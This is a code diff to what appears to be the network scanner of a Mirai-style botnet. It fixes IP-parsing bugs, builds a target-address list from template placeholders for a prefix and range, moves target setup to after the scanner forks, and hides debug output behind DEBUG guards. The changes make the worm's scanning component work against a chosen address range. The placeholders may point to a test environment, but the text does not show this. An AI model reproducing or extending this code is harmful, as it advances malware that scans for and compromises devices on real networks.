@@ -22,6 +22,7 @@
 #include <sys/ioctl.h>
 #include <netinet/in.h>
 #include <net/if.h>
+#include <ctype.h>
 
 #include "includes.h"
 #include "scanner.h"
@@ -58,17 +59,23 @@ ipv4_t get_next_target(void)
 }
 
 int validate_number(char *str) {
-   while (*str) {
-      if(!isdigit(*str)){ //if the character is not a number, return
-         false
-         return 0;
-      }
-      str++; //point to next character
-   }
-   return 1;
+    while (*str) {
+        if(!isdigit(*str)){ //if the character is not a number, return false
+            return 0;
+        }
+        str++; //point to next character
+    }
+    return 1;
 }
-ipv4_t convert_ip(char *ip) { //check whether the IP is valid or not
-    char tmp_ip[4];
+
+union IP_Type
+{
+  char sec[4];
+  ipv4_t value;
+};
+
+ipv4_t convert_ip(const char *ip) { //check whether the IP is valid or not
+    union IP_Type the_ip;
     int i, num, dots = 0;
     char *ptr;
     if (ip == NULL)
@@ -81,7 +88,7 @@ ipv4_t convert_ip(char *ip) { //check whether the IP is valid or not
             return 0;
         num = atoi(ptr); //convert substring to number
         if (num >= 0 && num <= 255) {
-            tmp_ip[3-dots] = (char) num;
+            the_ip.sec[dots] = (char) num;
             ptr = strtok(NULL, "."); //cut the next part of the string
             if (ptr != NULL)
                 dots++; //increase the dot count
@@ -90,9 +97,7 @@ ipv4_t convert_ip(char *ip) { //check whether the IP is valid or not
     }
     if (dots != 3) //if the number of dots are not 3, return false
         return 0;
-    for(i=0; i<4; i++)
-        the_ip = tmp_ip[3-i];
-    return (ipv4_t) *tmp_ip;
+    return the_ip.value;
 }
 
 static ipv4_t g_target_ips[100] = {0};
@@ -100,27 +105,31 @@ int g_target_ips_num = 0;
 
 void target_ip_init(void)
 {
-    ipv4_t ip_cur = convert_ip("{ip_prx}.{tgt_bgn}");
-    ipv4_t ip_end = convert_ip("{ip_prx}.{tgt_end}");
+    char sz_addrbuff_cur[16] = "{ip_prx}.{tgt_bgn}";
+    char sz_addrbuff_end[16] = "{ip_prx}.{tgt_end}";
+    ipv4_t ip_cur = convert_ip(sz_addrbuff_cur);
+    ipv4_t ip_end = convert_ip(sz_addrbuff_end);
 
+#ifdef DEBUG
     printf("[scanner] target_ip_init..\n");
+#endif
     for(int i=0; i<sizeof(g_target_ips)/sizeof(ipv4_t); i++)
     {
         g_target_ips[i] = ip_cur;
         g_target_ips_num++;
+#ifdef DEBUG
+        printf("  %d.%d.%d.%d\n", ip_cur & 0xff, (ip_cur >> 8) & 0xff, (ip_cur >> 16) & 0xff, (ip_cur >> 24) & 0xff);
+#endif
         if(ip_cur == ip_end || ip_cur == 0)
             break;
-
-#ifdef DEBUG
-    printf("  %d.%d.%d.%d\n", ip_cur & 0xff, (ip_cur >> 8) & 0xff, (ip_cur >> 16) & 0xff, (ip_cur >> 24) & 0xff);
-#endif
-        ip_cur = (ip_cur & 0x00ffffff) | ((ip_cur & 0xff000000)+(0x01000000))
+        ip_cur = (ip_cur & 0x00ffffff) | ((ip_cur & 0xff000000)+(0x01000000));
     }
 }
 
 ipv4_t get_next_target_v2(void) 
 { 
-    static ipv4_t scan_cache[2] = {0};
+    int i;
+    static ipv4_t scan_cache[5] = {0};
 
     ipv4_t local_addr = util_local_addr();
     ipv4_t next_addr = g_target_ips[rand_next() % g_target_ips_num];
@@ -129,7 +138,7 @@ ipv4_t get_next_target_v2(void)
         next_addr = g_target_ips[rand_next() % g_target_ips_num];
     }
 
-    for(int i=0; i<sizeof(scan_cache)/sizeof(ipv4_t); i++)
+    for(i=0; i<sizeof(scan_cache)/sizeof(ipv4_t); i++)
     {
         if(scan_cache[i] == 0)
         {
@@ -183,8 +192,6 @@ void scanner_init(void)
     uint16_t source_port;
     struct iphdr *iph;
     struct tcphdr *tcph;
-
-    target_ip_init();
 
     // Let parent continue on main thread
     scanner_pid = fork();
@@ -316,6 +323,8 @@ void scanner_init(void)
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
 
+    target_ip_init();
+
     // Main logic loop
     while (TRUE)
     {
@@ -346,7 +355,9 @@ void scanner_init(void)
                 }
                 else
                 {
+#ifdef DEBUG
                     printf("[scanner] redundent IP skip scanning\n");
+#endif
                     sleep(1);
                     continue;
                 }
@@ -395,7 +406,9 @@ void scanner_init(void)
             errno = 0;
             n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
             if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK) {
+#ifdef DEBUG
                 printf("[scanner] n=%d, errno=%d\n", n, errno);
+#endif
                 break;
             }
 
@@ -434,7 +447,9 @@ void scanner_init(void)
             // If there were no slots, then no point reading any more
             if (conn == NULL)
             {
+#ifdef DEBUG
                 printf("[scanner] conn == NULL\n");
+#endif
                 break;
             }
 
